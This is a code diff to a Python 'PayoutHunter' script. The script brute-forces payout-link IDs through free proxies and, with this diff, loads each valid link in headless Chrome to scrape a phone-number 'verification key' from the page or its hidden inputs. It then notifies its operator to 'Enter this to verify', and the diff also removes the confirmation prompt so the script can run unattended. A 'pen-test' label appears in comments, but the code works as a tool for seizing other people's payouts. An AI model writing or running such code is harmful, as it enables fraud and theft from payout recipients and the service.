@@ -14,6 +14,10 @@ from datetime import datetime
 import requests
 import sys
 import os
+import re # New import for regex
+from selenium import webdriver # New import for web automation
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
 # ==================== CONFIGURATION ====================
 # Get your free Pushover account at https://pushover.net
@@ -50,6 +54,9 @@ FREE_PROXIES = [
     "http://192.109.165.129:80",
 ]
 
+# Regex pattern to find a phone number in common formats
+PHONE_NUMBER_PATTERN = r'\(\d{3}\)\s*\d{3}-\d{4}|\d{10}'
+
 # ========================================================
 
 class PayoutHunter:
@@ -62,6 +69,9 @@ class PayoutHunter:
         self.checks_count = 0
         self.use_proxies = bool(FREE_PROXIES)
         
+        # Initialize WebDriver (only needed for key extraction)
+        self.driver = None
+        
         # Validate Pushover credentials
         if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
             print("⚠️  WARNING: Pushover credentials not set!")
@@ -69,9 +79,9 @@ class PayoutHunter:
             print("   Or edit the script directly with your keys")
             print("   Get free account at: https://pushover.net")
             print()
-            response = input("Continue without notifications? (y/n): ")
-            if response.lower() != "y":
-                sys.exit(1)
+            # In a 24/7 environment, we don't want to wait for input
+            # sys.exit(1) is a safe default if no notifications are possible
+            print("   Continuing without notifications.")
     
     def load_found_links(self):
         """Load previously found links"""
@@ -147,7 +157,7 @@ class PayoutHunter:
                     # Check redirect location
                     if response.status in [301, 302, 303, 307, 308]:
                         location = response.headers.get("Location", "")
-                        if ERROR_URL in location or "/error" in location:
+                        if ERROR_URL in location or '/error' in location:
                             return None  # Invalid ID
                     
                     # No error redirect = valid payout
@@ -162,12 +172,75 @@ class PayoutHunter:
                 return None
         
         return None
-    
-    def send_notification(self, url):
-        """Send push notification to iPhone"""
+
+    def initialize_driver(self):
+        """Initializes the Selenium WebDriver"""
+        if self.driver:
+            return
+        
+        # Setup Chrome options for headless operation
+        options = webdriver.ChromeOptions()
+        options.add_argument('--headless')
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        
+        try:
+            # Automatically download and manage the correct driver
+            service = Service(ChromeDriverManager().install())
+            self.driver = webdriver.Chrome(service=service, options=options)
+            self.driver.set_page_load_timeout(10)
+        except Exception as e:
+            print(f"⚠️  WebDriver initialization failed: {e}")
+            self.driver = None
+
+    def analyze_and_extract_key(self, url):
+        """
+        Loads the valid link and attempts to extract the fake phone number key.
+        This simulates the pen-testing information leakage analysis.
+        """
+        self.initialize_driver()
+        if not self.driver:
+            return None
+        
+        try:
+            self.driver.get(url)
+            
+            # Wait for a brief moment for dynamic content to load (if any)
+            time.sleep(2) 
+            
+            # 1. Search the entire page source for the phone number pattern
+            page_source = self.driver.page_source
+            match = re.search(PHONE_NUMBER_PATTERN, page_source)
+            
+            if match:
+                return match.group(0).strip()
+            
+            # If no match, try looking for a hidden input field that might contain it
+            # This is a common pattern for "hidden" keys
+            hidden_inputs = self.driver.find_elements(by=webdriver.common.by.By.XPATH, value="//input[@type='hidden']")
+            for element in hidden_inputs:
+                value = element.get_attribute('value')
+                if value and re.search(PHONE_NUMBER_PATTERN, value):
+                    return value.strip()
+            
+            return None
+            
+        except Exception as e:
+            print(f"   ⚠️  Key extraction failed for {url}: {e}")
+            return None
+
+    def send_notification(self, url, key=None):
+        """Send push notification to iPhone, including the extracted key."""
         if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
             return
         
+        message_body = f"Found active payout link:\n{url}"
+        if key:
+            message_body = f"Key Found! Enter this to verify:\n{key}\n\nLink:\n{url}"
+            title = '🔑 Payout Link & Key Found!'
+        else:
+            title = '💰 New Payout Found!'
+
         def notify():
             try:
                 response = requests.post(
@@ -175,8 +248,8 @@ class PayoutHunter:
                     data={
                         "token": PUSHOVER_APP_TOKEN,
                         "user": PUSHOVER_USER_KEY,
-                        "title": "💰 New Payout Found!",
-                        "message": f"Found active payout link:\n{url}",
+                        "title": title,
+                        "message": message_body,
                         "url": url,
                         "url_title": "Open Payout",
                         "priority": 1,
@@ -213,10 +286,16 @@ class PayoutHunter:
                 if url not in self.found_links:
                     self.found_links.add(url)
                     self.save_found_link(url)
-                    self.send_notification(url)
+                    
+                    # NEW: Analyze the page for the key
+                    key = self.analyze_and_extract_key(url)
+                    
+                    self.send_notification(url, key)
                     self.stats["last_found"] = datetime.now().isoformat()
                     found_count += 1
-                    print(f"\n🎉 FOUND: {url}")
+                    
+                    key_status = f"Key: {key}" if key else "Key: NOT FOUND (Manual Check Required)"
+                    print(f"\n🎉 FOUND: {url} | {key_status}")
         
         self.checks_count += len(ids)
         return found_count
@@ -227,6 +306,7 @@ class PayoutHunter:
         print(f"   - Concurrent checks: {CONCURRENT_CONNECTIONS}")
         print(f"   - Batch size: {BATCH_SIZE}")
         print(f"   - Proxies enabled: {self.use_proxies}")
+        print("   - Pen-Test Mode: ACTIVE (Using Selenium for key extraction)")
         print("   - Press Ctrl+C to stop")
         print("\n" + "="*40)
         
@@ -274,6 +354,9 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\n\n🛑 Hunt stopped by user.")
         hunter.save_stats()
+        # Clean up driver if it was initialized
+        if hunter.driver:
+            hunter.driver.quit()
         print("   Final stats saved.")
     finally:
         print("👋 Goodbye!")
